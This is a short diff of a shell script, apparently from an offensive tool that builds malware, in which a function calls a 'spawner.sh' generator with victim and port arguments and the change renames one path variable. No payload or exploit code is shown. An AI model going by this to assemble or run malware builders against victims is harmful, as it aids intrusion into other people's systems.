@@ -32,7 +32,7 @@ malware(){
    fi
    cout "Building $1..."
    sleep 1
-   bash $PODGL/sys/malware/$MALWARE/$PLATFORM/$TYPE/spawner.sh $VICTIM $PORT $1 &> /dev/null
+   bash $PODGL/sys/malware/$MALWARE/$PLATFORM/$ACTION/spawner.sh $VICTIM $PORT $1 &> /dev/null
    if [ ! -f "$1" ]; then
        cerr "An Error Was Occured While Building $1, use show options or show values and set all required values"
        exit 1
